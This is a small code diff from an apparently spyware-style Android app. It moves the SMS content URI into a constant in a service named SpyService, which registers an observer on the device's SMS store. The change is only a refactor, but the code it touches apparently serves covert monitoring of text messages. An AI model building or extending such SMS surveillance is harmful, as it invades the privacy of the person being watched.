@@ -14,12 +14,12 @@ import com.irodyk.spyagent.control.sms.SmsObserver;
  */
 public class SpyService extends Service {
 
+    private static final Uri SMS_STATUS_URI = Uri.parse("content://sms");
 
     @Override
     public void onCreate() {
         super.onCreate();
 
-        final Uri SMS_STATUS_URI = Uri.parse("content://sms");
         SmsObserver smsSentObserver = new SmsObserver(new Handler(), this);
         this.getContentResolver().registerContentObserver(SMS_STATUS_URI, true, smsSentObserver);
     }
